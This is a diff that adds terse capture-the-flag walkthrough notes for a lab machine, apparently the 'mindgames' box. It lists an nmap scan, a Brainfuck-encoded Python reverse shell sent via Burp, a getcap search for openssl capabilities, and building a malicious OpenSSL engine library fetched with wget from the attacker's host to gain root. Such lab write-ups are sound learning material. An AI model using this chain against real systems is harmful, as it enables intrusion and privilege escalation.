@@ -1,0 +1,11 @@
+1 - nmap -A 10.10.208.66
+2 - Burp Suite -> http://10.10.208.66 -> Click Run it! -> Repeater
+3 - Brain Fuck Decode -> print("Hello, World") ---> PYTHON
+4 - Python Reverse Shell -> Brain Fuck Encode -> POST
+5 - cat /home/mindgames/user.txt
+6 - getcap / -r 2>/dev/null (openssl)
+7 - gcc -fPIC -o a.o -c engine.c
+8 - gcc -shared -o engine.so -lcrypto a.o
+9 - wget http://10.8.94.51:8000/engine.so
+10 - openssl req -engine ./engine.so
+11 - cat /root/root.txt
